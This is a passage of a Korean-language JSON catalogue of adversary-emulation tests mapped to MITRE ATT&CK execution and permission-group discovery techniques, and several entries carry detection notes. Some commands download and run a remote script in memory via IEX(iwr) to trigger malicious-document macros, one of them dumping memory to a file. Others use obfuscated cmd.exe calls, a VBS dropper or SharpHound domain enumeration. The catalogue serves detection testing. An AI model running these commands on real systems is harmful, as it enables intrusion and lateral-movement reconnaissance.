          "command": "Start-Process \"#{script_path}\"",
          "cleanup_command": "Remove-Item \"#{script_path}\" -Force -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "127b4afe-2346-4192-815c-69042bec570e",
      "name": "Writes text to a file and displays it",
      "platforms": ["windows"],
      "summary": "CMD를 이용해 텍스트를 파일에 기록한 뒤, 같은 프로세스에서 바로 내용을 출력하는 패턴으로, 악성 파일 드롭 + 확인 절차를 단순화해 재현.",
      "procedure": [
        "1) echo \"#{message}\" > \"#{file_contents_path}\" 로 지정 경로에 파일을 생성하고 내용을 기록한다.",
        "2) type \"#{file_contents_path}\" 로 파일 내용을 콘솔에 출력한다.",
        "3) 테스트 후 del 명령으로 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "echo \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"",
          "cleanup_command": "del \"#{file_contents_path}\" >nul 2>&1"
        }
      ]
    },

    {
      "test_id": "d0eb3597-a1b3-4d65-b33b-2cda8d397f20",
      "name": "Suspicious Execution via Windows Command Shell",
      "platforms": ["windows"],
      "summary": "환경 변수(SubString 연산)를 악용해 cmd.exe를 간접 호출하는 난독화된 명령행 패턴을 재현.",
      "procedure": [
        "1) %LOCALAPPDATA:~-3,1%md 구문을 사용해 실제 cmd.exe를 우회적으로 호출한다.",
        "2) /c echo #{input_message} > #{output_file} 로 파일에 메시지를 기록한다.",
        "3) type #{output_file} 로 내용을 출력한다.",
        "4) 이와 같은 비표준 cmd 호출 패턴은 탐지 시그니처 설계 시 참고할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "6b2903ac-8f36-450d-9ad5-b220e8a2dcb9",
      "name": "Simulate BlackByte Ransomware Print Bombing",
      "platforms": ["windows"],
      "summary": "BlackByte 랜섬웨어가 tree.dll(랜섬 노트)을 Wordpad로 여러 번 열고 프린트하는 'Print Bombing' 행위를 Wordpad 다중 실행 + /p 인자로 모사.",
      "procedure": [
        "1) 사전 조건으로 file_to_print 경로에 테스트용 텍스트 파일을 생성한다.",
        "2) PowerShell에서 cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" 를 실행한다.",
        "3) 지정된 횟수(max_to_print, 기본 75)만큼 wordpad.exe 프로세스가 생성되며 파일을 출력하도록 시도한다.",
        "4) 테스트 종료 후 Stop-Process -name wordpad -force 로 모든 Wordpad 인스턴스를 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null",
          "cleanup_command": "stop-process -name wordpad -force -erroraction silentlycontinue"
        }
      ]
    },

    {
      "test_id": "df81db1b-066c-4802-9bc8-b6d030c3ba8e",
      "name": "Command Prompt reads CMD file via stdin and executes it (Raspberry Robin style)",
      "platforms": ["windows"],
      "summary": "cmd.exe 의 표준 입력 리다이렉션(cmd < file) 기능을 이용해 .cmd 파일 내용을 직접 읽어 실행하는 패턴으로, Raspberry Robin이 사용하는 방식과 유사.",
      "procedure": [
        "1) 사전 조건으로 input_file 경로에 t1059.003_cmd.cmd 파일을 다운로드/저장한다.",
        "2) cmd /r cmd<\"#{input_file}\" 를 실행하여 내부 cmd 가 파일 내용을 표준 입력으로 받아 명령을 실행한다.",
        "3) 이 파일에는 calc.exe 실행 등 악성 페이로드 호출이 포함될 수 있다.",
        "4) 별도 정리(cleanup)는 정의되어 있지 않으나, 실환경에선 파일 및 아티팩트를 수동 제거할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "cmd /r cmd<\"#{input_file}\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "00682c9f-7df4-4df8-950b-6dcaaa3ad9af",
      "name": "Command prompt writing VBScript to file then executing it (DarkGate style)",
      "platforms": ["windows"],
      "summary": "DarkGate 2단계처럼 cmd.exe에서 직접 VBScript를 디스크에 작성한 뒤, 즉시 해당 스크립트를 실행해 whoami를 수행하는 드롭퍼 패턴.",
      "procedure": [
        "1) cmd.exe /c cd /d #{script_path} 로 작업 디렉터리를 지정된 script_path로 변경한다.",
        "2) echo 를 이용해 VBS 코드를 #{script_name}.vbs 파일로 기록한다.",
        "   - Set objShell = CreateObject(\"WScript.Shell\")",
        "   - Set objExec = objShell.Exec(\"whoami\")",
        "   - 이후 객체를 정리(Set ... = Nothing)하는 코드가 포함된다.",
        "3) 생성된 #{script_name}.vbs 를 바로 실행하여 whoami 명령을 수행한다.",
        "4) 테스트 종료 후 .vbs 파일을 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "c:\\windows\\system32\\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs",
          "cleanup_command": "del \"#{script_name}.vbs\" >nul 2>&1"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1059.005",
  "technique_name": "Command and Scripting Interpreter: Visual Basic",
  "tactic": "Execution",
  "description": "공격자는 Visual Basic(VBScript, VBA)을 명령·스크립트 인터프리터로 악용하여 시스템 정보 수집, 인코딩된 스크립트 실행, 메모리 상 데이터 추출 등 다양한 악성 행위를 수행할 수 있다. 이 기법은 cscript/wscript, Office 매크로(VBA), ScriptControl 등을 통해 실행되며, 파일리스/매크로 기반 공격과 결합될 경우 탐지가 더 어려워진다.",

  "tests": [
    {
      "test_id": "1620de42-160a-4fe5-bbaf-d3fef0181ce9",
      "name": "Visual Basic script execution to gather local computer information",
      "platforms": ["windows"],
      "summary": "PowerShell에서 cscript.exe를 호출해 VBScript(sys_info.vbs)를 실행하고, 로컬 시스템 정보를 TEMP 경로의 출력 파일(T1059.005.out.txt)에 저장하는 패턴.",
      "procedure": [
        "1) 사전 조건으로 PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs 경로에 샘플 VBScript를 다운로드한다.",
        "2) PowerShell에서 cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt 명령을 실행한다.",
        "3) VBScript는 WMI/환경 정보 등을 조회해 결과를 표준 출력으로 내보내고, 이것이 리다이렉트되어 TEMP\\T1059.005.out.txt 파일에 기록된다.",
        "4) 분석자는 해당 파일을 열어 수집된 로컬 컴퓨터 정보(호스트명, OS, 하드웨어 등)를 확인할 수 있다.",
        "5) 테스트 종료 후 출력 파일은 Remove-Item으로 삭제하여 흔적을 정리한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "cscript \"#{vbscript}\" > $env:TEMP\\T1059.005.out.txt",
          "cleanup_command": "Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "e8209d5f-e42d-45e6-9c2f-633ac4f1eefa",
      "name": "Encoded VBS code execution (malicious document + ScriptControl)",
      "platforms": ["windows"],
      "summary": "64비트 Microsoft Word 환경에서 악성 문서 매크로(Invoke-Maldoc)를 통해 인코딩된 VBS 코드를 ScriptControl로 실행하는 시나리오를 모사하며, 성공 시 \"ART T1059.005\" 메시지 박스를 표시.",
      "procedure": [
        "1) 선행 조건으로 64비트 Microsoft Word가 설치되어 있어야 하며, COM 객체 \"Word.Application\"의 경로를 체크해 (x86)이 포함되지 않는지 확인한다.",
        "2) PowerShell에서 Invoke-MalDoc.ps1 스크립트를 GitHub에서 다운로드하여 메모리에 로드한다.",
        "3) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\" 를 호출한다.",
        "4) Word 매크로는 ScriptControl을 이용해 인코딩된 VBS 코드를 디코딩/실행하고, 기본 동작으로 \"ART T1059.005\" 내용을 가진 메시지 박스를 띄운다.",
        "5) 테스트 종료 후 mshta 기반 보조 프로세스 등 잔여 프로세스를 Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"} 로 탐지 후 Stop-Process로 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing);\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"",
          "cleanup_command": "Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"} | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null"
        }
      ]
    },

    {
      "test_id": "8faff437-a114-4547-9a60-749652a03df6",
      "name": "Extract Memory via VBA",
      "platforms": ["windows"],
      "summary": "Word 매크로(VBA)를 이용해 메모리 상 문자열 포인터를 얻고, 해당 메모리 내용을 파일($env:TEMP\\atomic_t1059_005_test_output.bin)에 덤프하는 메모리 추출 기법을 에뮬레이션.",
      "procedure": [
        "1) 선행 조건으로 Microsoft Word(기본 ms_product=Word)가 설치되어 있어야 하며, COM 객체 \"Word.Application\" 생성으로 존재 여부를 확인한다.",
        "2) PowerShell에서 Invoke-MalDoc.ps1를 TLS1.2로 GitHub에서 다운로드 후 IEX로 로드한다.",
        "3) Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\" 를 실행한다.",
        "4) Word 매크로는 문자열을 메모리에 생성한 뒤, 해당 문자열의 포인터를 획득하고 이를 이용해 특정 메모리 영역의 내용을 읽어 TEMP 경로의 atomic_t1059_005_test_output.bin 파일로 저장한다.",
        "5) 이 파일은 실제 환경에서는 크리덴셜/키/페이로드 조각 등 민감 데이터를 포함할 수 있는 영역 덤프를 의미하며, 메모리 포렌식 및 탐지 룰 설계 시 참고할 수 있다.",
        "6) 테스트 종료 후 Remove-Item으로 출력 바이너리 파일을 삭제하여 환경을 원복한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing);\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
          "cleanup_command": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1059.007",
  "technique_name": "Command and Scripting Interpreter: JavaScript",
  "tactic": "Execution",
  "description": "공격자는 Windows Script Host(cscript.exe, wscript.exe)를 통해 JScript(JavaScript 기반 스크립트)를 실행하여 시스템 정보를 수집하거나 추가 페이로드를 로드하는 등 악성 행위를 수행할 수 있다. 이 기법은 파일 기반(sys_info.js 등) 또는 인메모리 방식으로 악용될 수 있으며, 전통적인 EXE 실행보다 탐지가 어려운 경우가 많다.",

  "tests": [
    {
      "test_id": "01d75adf-ca1b-4dd1-ac96-7c9550ad1035",
      "name": "JScript execution to gather local computer information via cscript",
      "platforms": ["windows"],
      "summary": "cscript.exe로 JScript(sys_info.js)를 실행해 로컬 시스템 정보를 수집하고, 결과를 %TEMP%\\T1059.007.out.txt 파일에 저장하는 패턴.",
      "procedure": [
        "1) 사전 조건으로 PathToAtomicsFolder\\T1059.007\\src\\sys_info.js 경로에 JScript 샘플(sys_info.js)을 생성·다운로드한다.",
        "2) PowerShell 의 get_prereq 단계에서 대상 경로의 상위 디렉터리를 만들고, GitHub에서 sys_info.js를 내려받아 저장한다.",
        "3) 명령 프롬프트에서 cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt 를 실행한다.",
        "4) sys_info.js는 WMI/환경 변수 등을 이용해 호스트명, OS, 네트워크 등 시스템 정보를 표준 출력으로 내보내고, 이 출력은 리다이렉트되어 %TEMP%\\T1059.007.out.txt에 기록된다.",
        "5) 분석자는 출력 파일을 열어 어떤 정보가 수집됐는지 확인할 수 있으며, 실제 공격에서는 이 파일이 후속 유출(압축/전송) 전 단계 아티팩트가 된다.",
        "6) 테스트 종료 시 del %tmp%\\T1059.007.out.txt >nul 2>&1 로 출력 파일을 삭제해 흔적을 정리한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "cscript \"#{jscript}\" > %tmp%\\T1059.007.out.txt",
          "cleanup_command": "del %tmp%\\T1059.007.out.txt >nul 2>&1"
        }
      ]
    },

    {
      "test_id": "0709945e-4fec-4c49-9faf-c3c292a74484",
      "name": "JScript execution to gather local computer information via wscript",
      "platforms": ["windows"],
      "summary": "wscript.exe로 동일한 JScript(sys_info.js)를 GUI 모드로 실행해, 시스템 정보를 메시지 박스 형태로 4회 표시하는 패턴.",
      "procedure": [
        "1) 사전 조건으로 PathToAtomicsFolder\\T1059.007\\src\\sys_info.js 경로에 JScript 샘플(sys_info.js)을 다운로드한다(위 cscript 테스트와 동일한 prereq 구조).",
        "2) 명령 프롬프트에서 wscript \"#{jscript}\" 를 실행한다.",
        "3) wscript.exe는 콘솔이 아닌 GUI 컨텍스트로 스크립트를 실행하며, 스크립트는 호스트명, OS 버전, 사용자 정보 등 시스템 정보를 순차적으로 네 개의 메시지 박스에 나누어 표시한다.",
        "4) 사용자는 메시지 박스를 클릭하며 정보를 확인하게 되며, 실제 공격에서는 사용자 속이기/피싱(UI 기반 정보 노출) 시나리오로 확장될 수 있다.",
        "5) 테스트는 별도의 정리(cleanup) 명령 없이 메시지 박스 종료와 함께 종료된다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wscript \"#{jscript}\""
        }
      ]
    }
  ]
},
{
  "technique_id": "T1059.010",
  "technique_name": "Command and Scripting Interpreter: AutoHotKey & AutoIT",
  "tactic": "Execution",
  "description": "공격자는 AutoHotKey나 AutoIT 같은 스크립트 엔진을 악용하여, PowerShell이나 cmd.exe 대신 상대적으로 보안 모니터링이 약한 사용자 자동화 도구를 통해 악성 스크립트를 실행할 수 있다. 이 도구들은 키 입력 자동화, 창 제어, 프로세스 실행 등을 지원하기 때문에, 사용자 행위를 가장하거나 백그라운드에서 페이로드를 로딩하는 데 활용될 수 있다.",

  "tests": [
    {
      "test_id": "7b5d350e-f758-43cc-a761-8e3f6b052a03",
      "name": "AutoHotKey script execution",
      "platforms": ["windows"],
      "summary": "AutoHotKey 실행 파일(AutoHotKeyU64.exe)을 이용해 calc.ahk 스크립트를 실행하고, 메시지 박스와 계산기(calc.exe)를 띄우는 시나리오. 실제 공격에서는 동일 패턴으로 키로깅, 명령 실행, 백그라운드 페이로드 실행 등에 악용될 수 있다.",

      "prerequisites": [
        "1) 대상 호스트에 AutoHotKey 실행 파일이 존재해야 한다.",
        "2) 기본 경로는 $PathToAtomicsFolder\\..\\ExternalPayloads\\ahk\\AutoHotKeyU64.exe 로 가정한다.",
        "3) Get-Prereq 단계에서는 다음을 수행한다:",
        "   - PathToAtomicsFolder\\..\\ExternalPayloads\\ 디렉터리를 생성한다.",
        "   - https://www.autohotkey.com/download/ahk.zip ZIP 파일을 다운로드한다.",
        "   - 다운로드한 ahk.zip을 ExternalPayloads 경로에 압축 해제하여 AutoHotKeyU64.exe를 준비한다.",
        "4) AutoHotKey 스크립트(calc.ahk)는 PathToAtomicsFolder\\T1059.010\\src\\calc.ahk 경로에 존재해야 한다."
      ],

      "procedure": [
        "1) 사전 준비로 PathToAtomicsFolder\\..\\ExternalPayloads\\ 경로를 만들고, AutoHotKey ZIP(ahk.zip)을 다운로드 후 압축을 해제하여 AutoHotKeyU64.exe를 준비한다.",
        "2) 공격자는 calc.ahk 같은 AutoHotKey 스크립트를 PathToAtomicsFolder\\T1059.010\\src\\calc.ahk 에 배치한다. 이 스크립트에는 메시지 박스 출력과 calc.exe 실행 로직이 포함된다.",
        "3) PowerShell에서 Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\" 명령을 실행해 AutoHotKey 엔진을 통해 스크립트를 실행한다.",
        "4) 스크립트 실행에 성공하면 메시지 박스가 표시되고, Windows 계산기(calc.exe)가 실행된다.",
        "5) 실제 공격 시나리오에서는 메시지 박스를 빼고 백그라운드로만 동작하게 하거나, calc.exe 대신 cmd.exe, powershell.exe, 추가 악성 페이로드를 실행하는 명령을 넣어 악성 행위를 수행할 수 있다.",
        "6) 수집·분석 관점에서는 AutoHotKeyU64.exe 실행 흔적, calc.ahk 파일 경로, 명령줄 인자(스크립트 경로), 그리고 이후 생성된 자식 프로세스(calc.exe 등)를 기반으로 탐지·추적할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\""
        }
      ]
    }
  ]
},{
  "technique_id": "T1069.001",
  "technique_name": "Permission Groups Discovery: Local Groups",
  "tactic": "Discovery",
  "description": "공격자는 로컬 그룹 및 관리자 그룹 구성원을 열람하여, 현재 계정의 권한 수준과 시스템 내 고권한 계정(특히 Administrators, Local Admin 등)을 파악한다. 이를 통해 추가 권한 상승 경로를 찾거나, 측면 이동(Lateral Movement) 시 어떤 계정을 악용할지 결정할 수 있다.",

  "tests": [
    {
      "test_id": "1f454dd6-e134-44df-bebb-67de70fb6cd8",
      "name": "Basic Permission Groups Discovery Windows (Local)",
      "platforms": ["windows"],
      "summary": "net localgroup 명령을 사용해 로컬 그룹 목록과 Administrators 그룹 구성원을 조회하여, 시스템에서 사용 가능한 권한 그룹과 로컬 관리자 그룹 멤버를 식별한다.",

      "prerequisites": [
        "1) 대상 시스템이 Windows 운영체제여야 한다.",
        "2) net.exe(기본 제공)가 정상 동작해야 한다.",
        "3) 도메인에 가입되지 않은 환경에서는 일부 도메인 관련 정보가 없거나 오류가 출력될 수 있다."
      ],
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 실행한다.",
        "2) net localgroup 명령을 통해 시스템 내 모든 로컬 그룹 목록을 조회한다.",
        "3) net localgroup \"Administrators\" 명령을 실행하여 로컬 Administrators 그룹에 포함된 계정 목록을 확인한다.",
        "4) 출력 결과를 바탕으로 공격자는 현재 호스트에서 고권한 계정(로컬 관리자 계정)을 식별하고, 이후 권한 상승이나 측면 이동 시 활용할 수 있다.",
        "5) 방어 관점에서는 net localgroup / Administrators 쿼리가 비정상 사용자나 스크립트에서 반복 호출되는지 모니터링해 탐지 지표로 사용할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net localgroup\nnet localgroup \"Administrators\""
        }
      ]
    },

    {
      "test_id": "a580462d-2c19-4bc7-8b9a-57a41b7d3ba4",
      "name": "Permission Groups Discovery PowerShell (Local)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Get-LocalGroup, Get-LocalGroupMember cmdlet을 사용해 로컬 그룹 및 Administrators 그룹 멤버를 조회한다.",

      "prerequisites": [
        "1) Windows PowerShell이 설치 및 활성화되어 있어야 한다.",
        "2) Get-LocalGroup, Get-LocalGroupMember cmdlet을 사용할 수 있는 환경(Win10 이상 / PowerShell 버전 요건)을 가정한다.",
        "3) 도메인에 가입되지 않은 환경에서는 도메인 관련 정보가 제한되거나 오류 메시지가 발생할 수 있다."
      ],
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) get-localgroup 명령으로 로컬 그룹 목록을 조회한다.",
        "3) Get-LocalGroupMember -Name \"Administrators\" 명령으로 로컬 Administrators 그룹 구성원을 나열한다.",
        "4) 공격자는 출력된 그룹 멤버를 통해, 현재 시스템에서 관리자 권한을 가진 계정 및 서비스 계정을 파악할 수 있다.",
        "5) 방어자는 Get-LocalGroup / Get-LocalGroupMember 호출 패턴을 명령줄 로그, PowerShell 로그(Event ID 4104/4103 등)로 수집·분석하여, 의심스러운 권한 그룹 열람 시도를 탐지할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "get-localgroup\nGet-LocalGroupMember -Name \"Administrators\""
        }
      ]
    },

    {
      "test_id": "e03ada14-0980-4107-aff1-7783b2b59bb1",
      "name": "SharpHound3 - LocalAdmin",
      "platforms": ["windows"],
      "summary": "BloodHound 수집기인 SharpHound.exe를 이용하여 도메인 환경에서 원격으로 각 호스트의 로컬 Administrators 그룹 구성원을 수집(LocalAdmin CollectionMethod)하는 시나리오.",

      "prerequisites": [
        "1) 대상 호스트가 AD 도메인에 가입(도메인 조인)되어 있어야 하며, 해당 계정이 도메인에 대해 적절한 조회 권한을 가지고 있어야 한다.",
        "2) SharpHound.exe가 #{sharphound_path} (기본: PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe)에 존재해야 한다.",
        "3) 필요 시 get_prereq_command 단계에서 ExternalPayloads 폴더 생성 후 GitHub에서 SharpHound.exe를 다운로드해 두어야 한다.",
        "4) 출력 디렉터리 경로(#{output_path}, 기본: $env:TEMP\\SharpHound\\)에 쓰기 권한이 있어야 한다."
      ],
      "procedure": [
        "1) PowerShell에서 SharpHound.exe가 지정된 경로(#{sharphound_path})에 존재하는지 확인한다.",
        "2) 존재하지 않을 경우, PathToAtomicsFolder\\..\\ExternalPayloads\\ 폴더를 생성하고 GitHub에서 SharpHound.exe를 다운로드해 배치한다.",
        "3) New-Item -Path \"#{output_path}\" -ItemType Directory 명령으로 SharpHound 결과 저장용 디렉터리를 생성한다.",
        "4) & \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\" 명령을 실행해 LocalAdmin 수집을 수행한다.",
        "5) SharpHound는 SAMR 등을 이용해 각 도메인 호스트의 로컬 Administrators 그룹 멤버 정보를 수집하고, JSON/ZIP 형태의 결과를 #{output_path}에 저장한다.",
        "6) 공격자는 이 결과를 BloodHound GUI로 불러와 그래프 형태로 분석하며, 도메인 내에서 어떤 계정이 어느 호스트의 Local Admin 권한을 가지는지 파악해 측면 이동 및 권한 상승 경로를 설계한다.",
        "7) 실험 종료 후 cleanup_command를 사용하면 생성된 결과 디렉터리(#{output_path})를 제거할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "New-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\""
        }
      ]
    },

    {
      "test_id": "7413be50-be8e-430f-ad4d-07bf197884b2",
      "name": "Wmic Group Discovery",
      "platforms": ["windows"],
      "summary": "wmic group get name 명령을 통해 WMI 인터페이스로 로컬 그룹 목록을 열람하는 시나리오.",

      "prerequisites": [
        "1) wmic.exe가 시스템에 존재해야 한다(Windows 10 일부/11 버전에서는 기본 제공이 줄어들 수 있음).",
        "2) 로컬 그룹 정보를 조회할 수 있는 권한이 필요하다(일반 사용자 권한으로도 대부분 조회 가능)."
      ],
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 실행한다.",
        "2) wmic group get name 명령을 실행하여 현재 시스템의 로컬 그룹 이름 목록을 가져온다.",
        "3) 공격자는 반환된 그룹 이름을 기반으로 Administrators, Remote Desktop Users, Backup Operators 등 공격에 유리한 그룹을 식별할 수 있다.",
        "4) 방어 측에서는 wmic group get name 호출을 명령줄 로그, 프로세스 생성 로그를 통해 모니터링하고, 스크립트나 비인가 계정에서의 반복 호출 여부를 탐지 지표로 삼을 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "wmic group get name"
        }
      ]
    },

    {
      "test_id": "69119e58-96db-4110-ad27-954e48f3bb13",
      "name": "WMIObject Group Discovery",
      "platforms": ["windows"],
      "summary": "PowerShell Get-WMIObject Win32_Group를 활용해 WMI를 통해 로컬 그룹 정보를 열람하는 시나리오.",

      "prerequisites": [
        "1) Windows PowerShell이 설치 및 활성화되어 있어야 한다.",
        "2) WMI(Win32_Group 클래스)에 정상적으로 접근 가능한 환경이어야 한다.",
        "3) 로컬 그룹 정보를 조회할 수 있는 권한(일반 사용자 수준)이 필요하다."
      ],
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) Get-WMIObject Win32_Group 명령을 실행하여, WMI를 통해 시스템에 존재하는 로컬 그룹 객체 목록을 가져온다.",
        "3) 결과에는 각 그룹의 도메인, 이름, SID 등의 정보가 포함될 수 있으며, 공격자는 이를 통해 중요한 그룹(관리자, 원격 접속 관련 그룹 등)을 식별한다.",
        "4) 이 방식은 기존 net localgroup보다 더 풍부한 메타데이터를 제공할 수 있어, 자동화된 스크립트에서 자주 사용될 수 있다.",
        "5) 방어자는 PowerShell의 WMI 호출(특히 Win32_Group 대상)을 모니터링하여, 평소와 다른 시점·계정에서 발생하는 그룹 열람 시도를 탐지할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-WMIObject Win32_Group"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1069.002",
  "technique_name": "Permission Groups Discovery: Domain Groups",
  "tactic": "Discovery",
  "description": "공격자는 AD(Active Directory) 도메인 내의 그룹/도메인 관리자/엔터프라이즈 관리자 등 고권한 도메인 그룹을 열람하여, 권한 상승·측면 이동에 활용 가능한 계정과 호스트를 식별한다. 이 과정에서 net, PowerShell(AD 모듈, PowerView), AdFind, LDIFDE, LDAPSearch 등 다양한 도구가 사용될 수 있다.",

  "tests": [
    {
      "test_id": "dd66d77d-8998-48c0-8024-df263dc2ce5d",
      "name": "Basic Permission Groups Discovery Windows (Domain)",
      "platforms": ["windows"],
      "summary": "net localgroup / net group /domain 명령을 통해 도메인 그룹(Enterprise Admins, Domain Admins 등)을 열람하여 도메인 내 고권한 그룹과 구성원을 식별한다.",

      "prerequisites": [
        "1) 대상 시스템이 Windows OS이며 AD 도메인에 가입(도메인 조인)되어 있어야 한다.",
        "2) net.exe(기본 제공)가 정상 동작해야 한다.",
        "3) 도메인 컨트롤러에 네트워크로 접근 가능해야 한다(네트워크 차단 시 net group /domain 결과가 실패할 수 있음)."
      ],
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 실행한다.",
        "2) net localgroup 명령으로 로컬 그룹 목록을 먼저 확인한다(도메인 환경인지 간접적으로 확인 가능).",
        "3) net group /domain 명령을 실행해 도메인 내 정의된 그룹 목록을 조회한다.",
        "4) net group \"enterprise admins\" /domain 명령으로 도메인 포리스트 전체를 관리할 수 있는 Enterprise Admins 그룹의 멤버를 확인한다.",
        "5) net group \"domain admins\" /domain 명령으로 해당 도메인의 Domain Admins 그룹 멤버를 확인한다.",
        "6) 공격자는 여기서 식별한 계정을 추가 공격(피싱, 자격 증명 탈취, 세션 가로채기 등)의 주요 타깃으로 삼을 수 있다.",
        "7) 방어자는 net group /domain, net group \"enterprise admins\" /domain, net group \"domain admins\" /domain 호출을 명령줄 로깅/EDR로 모니터링해 비인가 계정의 도메인 그룹 열람을 탐지 지표로 활용할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain"
        }
      ]
    },

    {
      "test_id": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7",
      "name": "Permission Groups Discovery PowerShell (Domain)",
      "platforms": ["windows"],
      "summary": "PowerShell의 get-ADPrincipalGroupMembership을 사용해 특정 사용자(기본: 현재 사용자)가 속한 AD 그룹 목록을 열람한다.",

      "prerequisites": [
        "1) 대상 시스템이 AD 도메인에 가입되어 있어야 한다.",
        "2) PowerShell ActiveDirectory 모듈이 설치·로드 가능해야 한다(일반적으로 RSAT AD 모듈).",
        "3) #{user} 계정에 대해 그룹 멤버십을 조회할 수 있는 권한이 필요하다(보통 도메인 사용자 권한으로 충분)."
      ],
      "procedure": [
        "1) PowerShell을 실행한다.",
        "2) get-ADPrincipalGroupMembership #{user} | select name 명령을 실행하여 해당 사용자가 속한 모든 도메인 그룹 이름을 출력한다.",
        "3) 공격자는 Domain Admins, Enterprise Admins, DNSAdmins, Account Operators 등 고위험 그룹에 사용자가 속해 있는지 확인하여 현재 계정의 권한 수준을 판단한다.",
        "4) 방어자는 AD 모듈 기반 쿼리(get-ADPrincipalGroupMembership)를 PowerShell 로그(Event ID 4104 등)로 수집하고, 비정상 계정 및 워크스테이션에서의 반복적인 그룹 조회를 탐지 포인트로 활용할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "get-ADPrincipalGroupMembership #{user} | select name"
        }
      ]
    },

    {
      "test_id": "0afb5163-8181-432e-9405-4322710c0c37",
      "name": "Elevated group enumeration using net group (Domain)",
      "platforms": ["windows"],
      "summary": "net groups / net group 명령을 다양한 철자·별칭으로 호출해 Account Operators, Exchange Organization Management, Backup Operators, Domain Admins 등 고권한 도메인 그룹을 열람한다.",

      "prerequisites": [
        "1) 대상 호스트가 AD 도메인에 가입되어 있어야 한다.",
        "2) 도메인 컨트롤러와 통신이 가능해야 한다.",
        "3) net.exe 사용이 차단되어 있지 않아야 한다."
      ],
      "procedure": [
        "1) 명령 프롬프트에서 다음 명령들을 순차적으로 실행한다.",
        "2) net groups \"Account Operators\" /domain   → Account Operators 그룹 구성원이 출력된다.",
